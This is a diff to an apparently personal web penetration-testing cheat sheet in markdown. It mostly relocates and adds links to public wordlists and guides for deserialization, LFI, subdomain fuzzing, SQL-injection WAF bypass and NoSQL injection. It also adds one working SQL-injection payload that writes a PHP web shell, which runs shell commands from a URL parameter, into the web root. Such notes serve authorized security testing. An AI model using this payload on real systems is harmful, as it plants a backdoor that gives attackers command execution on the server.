@@ -492,16 +492,7 @@ https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserializa
 https://github.com/pwntester/ysoserial.net
   
 https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
-  
-### Wordlist for SQL Injection - Bypass
-
-https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt
-
-### Doc for SQL Injection - Bypass
-
-https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
-
-## Local File Inclusion - LFI
+  ## Local File Inclusion - LFI
 
 ### LFI - files for fuzzing
 
@@ -524,3 +515,19 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/bur
 ### Wordlist for subdomain fuzzing
   
 https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
+
+### Wordlist for SQL Injection - Bypass
+
+https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt
+
+### Doc for SQL Injection - Bypass
+
+https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
+ 
+### Webshell via SQLI
+  
+' union select 1, 2, 3,"<?php system($_GET['cmd']);?>" into outfile"/var/www/html/pdp.php" -- -
+  
+## NOSQL Injection
+  
+https://book.hacktricks.xyz/pentesting-web/nosql-injection
